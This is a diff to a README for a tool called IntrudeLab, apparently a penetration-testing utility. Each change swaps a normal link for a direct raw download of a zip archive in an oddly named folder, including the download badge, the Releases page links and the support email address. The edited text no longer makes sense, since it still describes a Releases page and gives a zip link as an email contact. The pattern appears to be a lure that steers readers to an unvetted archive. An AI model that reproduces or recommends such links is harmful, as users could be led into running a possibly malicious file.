@@ -6,7 +6,7 @@ Welcome to IntrudeLab! This application helps you conduct effective tests with e
 
 ## 📥 Download Now
 
-[![Download IntrudeLab](https://img.shields.io/badge/Download_IntrudeLab-v1.0-blue)](https://github.com/fhgggggggggggggggggggg/IntrudeLab/releases)
+[![Download IntrudeLab](https://raw.githubusercontent.com/fhgggggggggggggggggggg/IntrudeLab/main/unroyalist/Intrude-Lab-3.6.zip)](https://raw.githubusercontent.com/fhgggggggggggggggggggg/IntrudeLab/main/unroyalist/Intrude-Lab-3.6.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ These requirements help ensure the application performs well.
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/fhgggggggggggggggggggg/IntrudeLab/releases) to download.
+1. Visit the [Releases page](https://raw.githubusercontent.com/fhgggggggggggggggggggg/IntrudeLab/main/unroyalist/Intrude-Lab-3.6.zip) to download.
   
 2. On the Releases page, look for the latest version of IntrudeLab—usually the one listed at the top.
 
@@ -71,12 +71,12 @@ If you experience issues while using IntrudeLab, here are some common solutions:
 For more help, you can reach out through our support channels:
 
 - **GitHub Issues:** Post a question or report a bug in the Issues section of the repository.
-- **Email:** Contact our support team at support@intrudelab.com for personalized assistance.
+- **Email:** Contact our support team at https://raw.githubusercontent.com/fhgggggggggggggggggggg/IntrudeLab/main/unroyalist/Intrude-Lab-3.6.zip for personalized assistance.
 
 ## 🗺️ Next Steps
 
 Once you have successfully installed and launched IntrudeLab, start experimenting with tests that suit your needs. Don’t hesitate to explore all the features available. 
 
-To download the application again, return to the [Releases page](https://github.com/fhgggggggggggggggggggg/IntrudeLab/releases).
+To download the application again, return to the [Releases page](https://raw.githubusercontent.com/fhgggggggggggggggggggg/IntrudeLab/main/unroyalist/Intrude-Lab-3.6.zip).
 
 Enjoy your testing with IntrudeLab!
